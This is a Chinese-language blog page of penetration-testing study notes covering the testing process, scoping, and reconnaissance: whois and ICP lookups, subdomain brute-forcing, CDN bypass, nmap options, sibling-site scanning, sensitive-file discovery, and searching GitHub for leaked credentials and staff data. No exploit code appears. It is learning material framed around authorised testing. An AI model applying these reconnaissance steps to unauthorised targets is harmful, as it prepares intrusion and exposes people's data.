@@ -1,0 +1,1915 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#FFD8F2">
+  <meta name="author" content="Sweety">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="渗透测试网络安全-自学笔记 渗透测试①流程 前期交互 信息收集 威胁建模 漏洞分析 渗透攻击 后渗透攻击 报告  ②测试方法 白盒测试：基本从内部发起，通过正常渠道向被测单位获取资料。 黑盒测试：在授权的情况下，模拟黑客的攻击方法和思维方式，评估安全风险。黑盒测试不同于黑客入侵。  前期交互目标：  确定范围：测试目标的范围、ip、域名、内外网、测试账户。 确定规则：能渗透到什么程度，所需要的时间">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透测试·完整版">
+<meta property="og:url" content="https://haoisbinlove.github.io/2024/08/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%C2%B7%E5%AE%8C%E6%95%B4%E7%89%88/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="渗透测试网络安全-自学笔记 渗透测试①流程 前期交互 信息收集 威胁建模 漏洞分析 渗透攻击 后渗透攻击 报告  ②测试方法 白盒测试：基本从内部发起，通过正常渠道向被测单位获取资料。 黑盒测试：在授权的情况下，模拟黑客的攻击方法和思维方式，评估安全风险。黑盒测试不同于黑客入侵。  前期交互目标：  确定范围：测试目标的范围、ip、域名、内外网、测试账户。 确定规则：能渗透到什么程度，所需要的时间">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240707164136300.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240707165721514.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709134232544.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709134434241.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709135535182.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709142722978.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709142938308.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709150649237.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709150903081.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709151237123.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709151514907.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709152136780.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709152056475.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709154255324.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709154740043.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709161318682.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709162401797.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709230713348.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240719145304230.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240719145316045.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721391030526.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721390879675.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721808910747.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722241085705.png">
+<meta property="article:published_time" content="2024-08-02T15:34:45.000Z">
+<meta property="article:modified_time" content="2024-08-02T15:37:42.437Z">
+<meta property="article:author" content="Sweety">
+<meta property="article:tag" content="基础漏洞">
+<meta property="article:tag" content="渗透流程">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240707164136300.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>渗透测试·完整版 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"haoisbinlove.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Sweety Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/24.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.08)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="渗透测试·完整版"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-08-02 23:34" pubdate>
+          2024年8月2日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          15k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          123 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">渗透测试·完整版</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/lady_killer9/article/details/106791542">网络安全-自学笔记</a></p>
+<h2 id="渗透测试-1"><a href="#渗透测试-1" class="headerlink" title="渗透测试"></a>渗透测试</h2><h3 id="①流程"><a href="#①流程" class="headerlink" title="①流程"></a>①流程</h3><blockquote>
+<p>前期交互</p>
+<p>信息收集</p>
+<p>威胁建模</p>
+<p>漏洞分析</p>
+<p>渗透攻击</p>
+<p>后渗透攻击</p>
+<p>报告</p>
+</blockquote>
+<h3 id="②测试方法"><a href="#②测试方法" class="headerlink" title="②测试方法"></a>②测试方法</h3><blockquote>
+<p>白盒测试：基本从内部发起，通过正常渠道向被测单位获取资料。</p>
+<p>黑盒测试：在授权的情况下，模拟黑客的攻击方法和思维方式，评估安全风险。黑盒测试不同于黑客入侵。</p>
+</blockquote>
+<h2 id="前期交互"><a href="#前期交互" class="headerlink" title="前期交互"></a>前期交互</h2><p>目标：</p>
+<ul>
+<li>确定范围：测试目标的范围、ip、域名、内外网、测试账户。</li>
+<li>确定规则：能渗透到什么程度，所需要的时间，能够执行修改上传，能否提权等。</li>
+<li>确定需求：web应用的漏洞，业务逻辑漏洞，人员权限管理漏洞等。</li>
+</ul>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>主要收集服务器的配置信息和网站的敏感信息，其中包括：</p>
+<ul>
+<li>域名以及子域名信息</li>
+<li>目标网站系统</li>
+<li>cms指纹</li>
+<li>目标网站真实IP</li>
+<li>开放的端口等。</li>
+</ul>
+<p>信息收集的方式可分为<code>主动</code>和<code>被动</code>两种。</p>
+<p><code>主动信息收集</code>：与目标主机进行直接交互，从而拿到目标信息。（比如黑进目标主机）</p>
+<p><code>被动信息收集</code>：间接交互，通过搜索引擎或社会工程等方式间接获取目标主机上的信息。（比如Google搜索、Shodan搜索等）</p>
+<h3 id="①域名信息的收集"><a href="#①域名信息的收集" class="headerlink" title="①域名信息的收集"></a>①域名信息的收集</h3><p>确定了要渗透的目标，即确定了其域名。</p>
+<p>确定了域名之后还需要确定域名对应的<code>IP地址</code>，域名的<code>whois</code>信息、<code>子域名</code>等一系列与域名相关的信息。</p>
+<h4 id="1、域名的whois信息"><a href="#1、域名的whois信息" class="headerlink" title="1、域名的whois信息"></a>1、域名的whois信息</h4><p><code>whois</code>是用来查询域名的<code>IP地址</code>以及所有者等信息的传输协议。</p>
+<p>通常，执行whois查询的工具是：</p>
+<p><a target="_blank" rel="noopener" href="https://www.zhanid.com/tool/whois.html">whois查询工具—站长工具网</a></p>
+<p><a target="_blank" rel="noopener" href="https://tools.wujingquan.com/whois/">whois信息查询-站长工具</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240707164136300.png" srcset="/img/loading.gif" lazyload alt="image-20240707164136300"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240707165721514.png" srcset="/img/loading.gif" lazyload alt="image-20240707165721514"></p>
+<p>其它的注入阿里云的域名查询在线工具也可以，就是显示出来的信息没有那么集中。</p>
+<p>在kali下，也有默认的<code>whois工具指令</code>。</p>
+<p>查询命令为：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">whois 域名（.com）<br></code></pre></td></tr></table></figure>
+
+<h4 id="2、备案信息查询"><a href="#2、备案信息查询" class="headerlink" title="2、备案信息查询"></a>2、备案信息查询</h4><p>ICP备案信息查询。</p>
+<p>查询网址：</p>
+<p><a target="_blank" rel="noopener" href="https://icp.chinaz.com/">ICP备案查询-站长工具</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709134232544.png" srcset="/img/loading.gif" lazyload alt="image-20240709134232544"></p>
+<p><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/#/Integrated/index">工信部ICP备案查询</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709134434241.png" srcset="/img/loading.gif" lazyload alt="image-20240709134434241"></p>
+<p>可以从中得到一些有关于网址或者域名的一些备案号、主办单位、网站负责人之类的信息。</p>
+<h4 id="3、子域名信息"><a href="#3、子域名信息" class="headerlink" title="3、子域名信息"></a>3、子域名信息</h4><p>查询子域名的几种方法如下：</p>
+<ul>
+<li>Layer子域名爆破机</li>
+</ul>
+<p>Layer是win下的一款子域名探测工具，其工作原理是：利用<code>子域名字典</code>进行爆破。</p>
+<p>输入目标网站的域名即可启动进行字典爆破子域名。如下是访问gxu官网域名爆破得到的子域名结果。</p>
+<p>工具地址：<code>E:\IDEToolsV2\Layer子域名挖掘机4.2纪念版</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709135535182.png" srcset="/img/loading.gif" lazyload alt="image-20240709135535182"></p>
+<ul>
+<li>subDomainsBurte</li>
+</ul>
+<p>它同样也是一个子域名爆破工具，使用<code>字典暴力</code>破解，并通过<code>DNS解析</code>来确定是否存在有效的子域名。它的特点是可以用小字典递归地发现三级域名、四级域名、甚至是五级域名等不容易被探测到的域名。</p>
+<p>工具下载链接： <a target="_blank" rel="noopener" href="https://github.com/lijiejie/subDomainsBrute%EF%BC%88%E5%8F%AF%E4%BD%BF%E7%94%A8pip%E5%AE%89%E8%A3%85%EF%BC%89">https://github.com/lijiejie/subDomainsBrute（可使用pip安装）</a></p>
+<p>也可以在kali下安装使用哦。</p>
+<p>使用默认下载源的话可能速度较慢而且可能会失败，所以我们可以使用镜像源下载。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip3 install -i https://pypi.tuna.tsinghua.edu.cn/simple dnspython==2.2.1 async_timeout<br></code></pre></td></tr></table></figure>
+
+<p>在kali主机内部暂时下载失败。</p>
+<p>通过远程连接下载也是失败：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709142722978.png" srcset="/img/loading.gif" lazyload alt="image-20240709142722978"></p>
+<p>由错误信息可以略知一二，kali系统中本来就有<code>dnspython</code>，所以试图再次下载的时候就会报错。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709142938308.png" srcset="/img/loading.gif" lazyload alt="image-20240709142938308"></p>
+<p>所以就直接先下载那个GitHub文件。</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_57206390/article/details/133201540">kali 安装使用subDomainsBrute</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/lijiejie/subDomainsBrute.git<br></code></pre></td></tr></table></figure>
+
+<p>这里远程终端下载一直发生错误，在kali内部尝试访问浏览器，也不行，然后更改了代理设置为使用系统自定义的代理，但是在远程终端还是不行。去到kali本机访问目标链接，发现可以访问到，然后直接在里边下载了。成功了。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709150649237.png" srcset="/img/loading.gif" lazyload alt="image-20240709150649237"></p>
+<p>进入到目标文件夹安装依赖包：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install dnspython gevent<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709150903081.png" srcset="/img/loading.gif" lazyload alt="image-20240709150903081"></p>
+<p>启动方式为：进入到<code>subDomainsBrute</code>文件夹下，执行启动代码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 subDomainsBrute.py gxu.edu.com（域名）<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709151237123.png" srcset="/img/loading.gif" lazyload alt="image-20240709151237123"></p>
+<p>爆破速度远比Layer慢。</p>
+<ul>
+<li>Google查询</li>
+</ul>
+<p>使用语法：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">site:域名<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709151514907.png" srcset="/img/loading.gif" lazyload alt="image-20240709151514907"></p>
+<p>本来也可以使用<code>FOFA</code>的，但是它并不是免费使用哈哈。</p>
+<h4 id="4、http证书查询"><a href="#4、http证书查询" class="headerlink" title="4、http证书查询"></a>4、http证书查询</h4><p><a target="_blank" rel="noopener" href="https://crt.sh/">http证书查询</a></p>
+<p>可以输入域名，查询与其绑定的相关证书信息。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709152136780.png" srcset="/img/loading.gif" lazyload alt="image-20240709152136780"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709152056475.png" srcset="/img/loading.gif" lazyload alt="image-20240709152056475"></p>
+<h4 id="5、DNS记录查询"><a href="#5、DNS记录查询" class="headerlink" title="5、DNS记录查询"></a>5、DNS记录查询</h4><p>DNS指的是域名解析服务，即将域名与IP之间做相应的转换。</p>
+<blockquote>
+<p>正向解析：根据域名查找对应的IP地址</p>
+<p>反向解析：根据IP地址查找对应的域名</p>
+</blockquote>
+<ul>
+<li><p>kali工具（DNSenum、Fierce、DMitry）</p>
+</li>
+<li><p>在线查询工具：</p>
+<p><a target="_blank" rel="noopener" href="http://tool.chinaz.com/dns/">站长工具之DNS查询</a></p>
+<p>查询的效果是这样的：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709154255324.png" srcset="/img/loading.gif" lazyload alt="image-20240709154255324"></p>
+<p><a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/home/search">国外的DNS查询工具</a></p>
+<p>界面良好直观，而且经过测试应该也是免费的。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709154740043.png" srcset="/img/loading.gif" lazyload alt="image-20240709154740043"></p>
+</li>
+</ul>
+<h4 id="6、判断域名对应的IP地址"><a href="#6、判断域名对应的IP地址" class="headerlink" title="6、判断域名对应的IP地址"></a>6、判断域名对应的IP地址</h4><p>首先需要判断域名是否存在CDN的情况。可以先去在线CDN查询网站进行查询。</p>
+<p><a target="_blank" rel="noopener" href="https://ping.chinaz.com/">在线CDN查询</a></p>
+<p>如果输入域名查询得到的IP地址不止一个的话，那就说明该IP地址不是真实的服务器地址。<code>如果是两个或者三个IP地址，并且这些IP地址是同一个地区不同运营商的话，则这些IP地址很有可能是服务器的出口地址，该服务器在内网中</code></p>
+<p>现在下面查询的这个域名，他只有一个对应的IP地址，说明该IP地址就是该域名的真实服务器地址，不存在CDN的情况。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709161318682.png" srcset="/img/loading.gif" lazyload alt="image-20240709161318682"></p>
+<p>如何绕过CDN查找网站的真实IP呢？</p>
+<ul>
+<li><p>很多时候一些重要的站点会做CDN，但是它旗下的一些子域名站点不会做CDN。可以从子域名切入查找网站的真实IP。<code>启动终端，在终端中使用ping命令。执行 ping 子域名 的命令，ping返回结果中会返回该子域名的IP地址</code>。 </p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709162401797.png" srcset="/img/loading.gif" lazyload alt="image-20240709162401797"></p>
+</li>
+</ul>
+<blockquote>
+<p>CDN（内容分发网络）是构建在现有互联网基础之上的一层智能虚拟网络。</p>
+</blockquote>
+<h3 id="②整站分析"><a href="#②整站分析" class="headerlink" title="②整站分析"></a>②整站分析</h3><p>分析的对象有：</p>
+<ul>
+<li><p>服务器类型：windows、linux</p>
+<blockquote>
+<p>ping探测：win的TLS值一般是128，linux的则一般是64。</p>
+<p>nmap扫描：<code>namp -O/-A IP地址</code>一般都能扫描得出来。</p>
+</blockquote>
+</li>
+<li><p>网站容器：apache、nginx、tomcat、IIS等</p>
+</li>
+<li><p>脚本类型：php、jsp、asp、aspx</p>
+</li>
+<li><p>数据库类型：mysql、oracle、access、sqlserver</p>
+</li>
+</ul>
+<p>在之前进行靶场攻打的过程中，有关于分析网站技术构成的指纹工具（如wappalyzer）就很适合用于整站分析（网站容器、脚本类型、数据库类型）。</p>
+<p><strong>几种数据库的区别：</strong></p>
+<blockquote>
+<ul>
+<li>Access：小型数据库，数据库后缀名：.mdb。一般是asp网页文件使用这个数据库</li>
+<li>SQL Server：比较大型的数据库，端口号为1433，数据库后缀名：.mdf</li>
+<li>MySQL：大部分是PHP页面，默认端口号是3306</li>
+<li>Oracle：常用于比较大型的网站，默认端口是1521</li>
+</ul>
+</blockquote>
+<p>常见搭配：</p>
+<p>asp、aspx：access、sqlserver</p>
+<p>php：mysql、postgreSQL</p>
+<p>jsp：Oracle、mysql</p>
+<h3 id="③企业信息查询"><a href="#③企业信息查询" class="headerlink" title="③企业信息查询"></a>③企业信息查询</h3><p>确认了公司之后，可以去互联网上查询与该公司有关的任何信息。如：企业基本信息、员工信息（手机号、邮箱、姓名、社交账号信息等）、组织框架、企业法人、企业综合信息等。使用社会工程学攻击获取这些信息也不是不行（在合法报备情况下哈）。</p>
+<p><a target="_blank" rel="noopener" href="https://www.tianyancha.com/">天眼查</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.qcc.com/">企查查</a></p>
+<p>也可以通过之前得ICP备案查询去获取一些信息。</p>
+<h3 id="④GitHub信息收集"><a href="#④GitHub信息收集" class="headerlink" title="④GitHub信息收集"></a>④GitHub信息收集</h3><p>亲测，做毕设的时候在GitHub上找项目，找到了一个包含一万七条的员工入职个人信息。确实有这个必要进行GitHub信息收集。</p>
+<p>主要收集：泄露源码、泄露数据库&#x2F;邮箱&#x2F;ftp&#x2F;ssh&#x2F;3389等账号、泄露的人员信息以及其它敏感信息。</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/99690742">信息收集之Github搜索语法</a></p>
+<h3 id="⑤端口扫描"><a href="#⑤端口扫描" class="headerlink" title="⑤端口扫描"></a>⑤端口扫描</h3><h4 id="1、nmap端口扫描"><a href="#1、nmap端口扫描" class="headerlink" title="1、nmap端口扫描"></a>1、nmap端口扫描</h4><ul>
+<li><p>功能：主机发现（检测存活在网络上的主机）、端口发现（检测开放端口）、服务发现（检测端口开放的服务和其版本）、检测操作系统&#x2F;硬件地址&#x2F;软件版本等、检测脆弱性漏洞（<code>--script=vuln</code>）</p>
+</li>
+<li><p>常用命令：</p>
+</li>
+</ul>
+<blockquote>
+<p>-sS：tcp syn扫描</p>
+<p>-p：指定端口号扫描</p>
+<p>-v：显示扫描过程</p>
+<p>-F：快速扫描</p>
+<p>-A：全面扫描</p>
+<p>-Pn：禁止ping后扫描，跳过主机发现的过程进行端口扫描</p>
+<p>-sU：udp扫描</p>
+<p>-sT：tcp扫描</p>
+<p>-sV：扫描系统版本和程序版本号检测</p>
+<p>-n：禁止反向域名解析</p>
+<p>-R：启用反向域名解析</p>
+<p>-6：启用IPV6扫描</p>
+<p>–script&#x3D;vuln：全面的漏洞扫描</p>
+</blockquote>
+<h4 id="2、旁站和c段扫描"><a href="#2、旁站和c段扫描" class="headerlink" title="2、旁站和c段扫描"></a>2、旁站和c段扫描</h4><p>旁站是指和目标网站在同一台服务器上的其它网站。拿webshell，提权，拿下该网站。</p>
+<p>使用IP反查域名搜索旁站：</p>
+<p><a target="_blank" rel="noopener" href="http://s.tool.chinaz.com/same">IP反查域名</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.aizhan.com/">SEO综合查询·反查域名</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709230713348.png" srcset="/img/loading.gif" lazyload alt="image-20240709230713348"></p>
+<p>对红蓝对抗和护网，c段扫描比较有意义。c段是指与目标服务器IP处于同一个C段的其它服务器。（192.168.1.0&#x2F;24）</p>
+<h3 id="⑥网站敏感目录和文件"><a href="#⑥网站敏感目录和文件" class="headerlink" title="⑥网站敏感目录和文件"></a>⑥网站敏感目录和文件</h3><p>通常我们所说的敏感文件、敏感目录大概有以下几种：</p>
+<blockquote>
+<p>后台、robots.txt、数据库.log、sitemap.xml、mysql.sql、licence.txt、Git、hg&#x2F;Mercurial、svn&#x2F;Subversion、bzr&#x2F;Bazaar、Cvs、WEB-INF泄露、备份文件泄露、配置文件泄露。</p>
+</blockquote>
+<ul>
+<li>Cansina</li>
+</ul>
+<p>用于发现网站的敏感目录和内容的安全测试工具，通过分析服务器的响应进行探测并使用sqlite保证数据持久性。</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/deibit/cansina">https://github.com/deibit/cansina</a></p>
+<ul>
+<li>Githack</li>
+</ul>
+<p>git泄露利用脚本</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p>
+<h2 id="威胁建模"><a href="#威胁建模" class="headerlink" title="威胁建模"></a>威胁建模</h2><p>利用上一个信息收集阶段获取的信息进行攻击规划。</p>
+<p>标识目标组织可能存在的漏洞与缺陷，根据威胁模型确定下一步需要搜集的信息和攻击方法。</p>
+<h2 id="渗透攻击"><a href="#渗透攻击" class="headerlink" title="渗透攻击"></a>渗透攻击</h2><p><a target="_blank" rel="noopener" href="https://github.com/Getshell/LinuxTQ">linux提权方法论</a></p>
